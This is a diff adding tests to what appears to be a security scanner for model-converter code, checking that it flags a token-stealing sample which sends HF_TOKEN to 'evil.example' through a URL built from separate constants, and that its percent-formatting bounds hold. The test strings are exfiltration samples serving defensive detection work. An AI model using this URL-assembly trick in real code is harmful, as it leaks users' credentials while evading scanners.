@@ -3996,6 +3996,86 @@ def test_percent_formatting_is_read_whichever_way_it_is_written():
     ) == []
 
 
+def test_a_url_assembled_out_of_named_constants_is_read_as_the_url_it_is():
+    """No literal in the file is a URL at all.
+
+    scheme = "https"; separator = "://"; host = "evil.example" assembles a
+    destination that nothing spelled, and every rule here reads literals, so
+    the only host recorded was an unused hub literal beside it. A name bound
+    exactly once to text that folds is now read as that text, which puts the
+    assembled URL back in front of the walk.
+
+    Substituting a value a name demonstrably has is not the same as guessing:
+    a name bound twice is left alone, and a hub URL assembled this way is still
+    the hub.
+    """
+    scan_converter_source = _load(
+        "converter_scan_inline_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n' + hub
+            + 'scheme = "https"\nseparator = "://"\nhost = "evil.example"\n'
+            + 'url = scheme + separator + host\n' + send
+        )
+    ]
+    # The same assembly that names the hub is the hub, so this reads a
+    # destination rather than refusing every file that builds one.
+    assert scan_converter_source(
+        'import os\nimport requests\n'
+        + 'scheme = "https"\nseparator = "://"\nhost = "huggingface.co"\n'
+        + 'url = scheme + separator + host\n' + send
+    ) == []
+    # A name bound more than once holds no one value, so it stays a hole and
+    # the destination stays unreadable. Reading the LAST binding instead would
+    # be a guess, and the request here is sent before it: the file fetches
+    # evil.example and rebinds the name to the hub afterwards.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n'
+            + 'host = "evil.example"\n'
+            + 'url = "https://" + host\n' + send
+            + 'host = "huggingface.co"\n'
+        )
+    ]
+
+
+def test_percent_formatting_is_bounded_before_it_runs():
+    """The aggregate budget is spent on what the walk reads, and the operator
+    runs before that. A thousand %(x)s fields and a 50 KB value build 50 MB out
+    of a 53 KB source, and both factors scale inside the 8 MiB the scan accepts,
+    so the size is estimated before the formatting rather than after it.
+    """
+    module = _load(
+        "converter_scan_percent_bound_probe", "unsloth_zoo/converter_scan.py",
+    )
+    source = (
+        'import os\nimport requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'url = "' + "%(x)s" * 1_000 + '" % {"x": "' + "A" * 50_000 + '"}\n'
+        'requests.get(HUB, params = {"t": os.environ["HF_TOKEN"]})\n'
+    )
+    started = time.perf_counter()
+    assert module.scan_converter_source(source) == []
+    assert time.perf_counter() - started < 5
+
+    # The tuple form has the same ceiling, and no output bound at all on it was
+    # the shape that got past the aggregate budget.
+    tuples = (
+        'import os\nimport requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'url = "' + "%s" * 500 + '" % ('
+        + ", ".join(['"' + "A" * 3_000 + '"'] * 500) + ')\n'
+        'requests.get(HUB, params = {"t": os.environ["HF_TOKEN"]})\n'
+    )
+    started = time.perf_counter()
+    assert module.scan_converter_source(tuples) == []
+    assert time.perf_counter() - started < 5
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
